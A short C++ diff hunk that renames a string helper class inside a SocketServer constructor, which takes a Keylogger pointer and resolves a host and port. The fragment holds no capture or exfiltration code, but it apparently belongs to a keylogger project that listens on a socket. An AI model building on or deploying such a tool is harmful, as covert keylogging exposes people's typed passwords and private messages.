@@ -24,8 +24,8 @@ SocketServer::SocketServer(Keylogger* logger) {
 	std::wcout << ComputerInfoHelper::getInstance()->getHostName() << L" " <<
 		ComputerInfoHelper::getInstance()->getIp() << std::endl;
 
-	result = getaddrinfo(StringUtilities::ws2s(ComputerInfoHelper::getInstance()->getIp()).c_str(),
-		StringUtilities::ws2s(ComputerInfoHelper::getInstance()->getPort()).c_str(), &hints, &addr);
+	result = getaddrinfo(StringHelper::ws2s(ComputerInfoHelper::getInstance()->getIp()).c_str(),
+		StringHelper::ws2s(ComputerInfoHelper::getInstance()->getPort()).c_str(), &hints, &addr);
 
 	if (result != 0) {
 		cerr << "getaddrinfo failed: " << result << "\n";
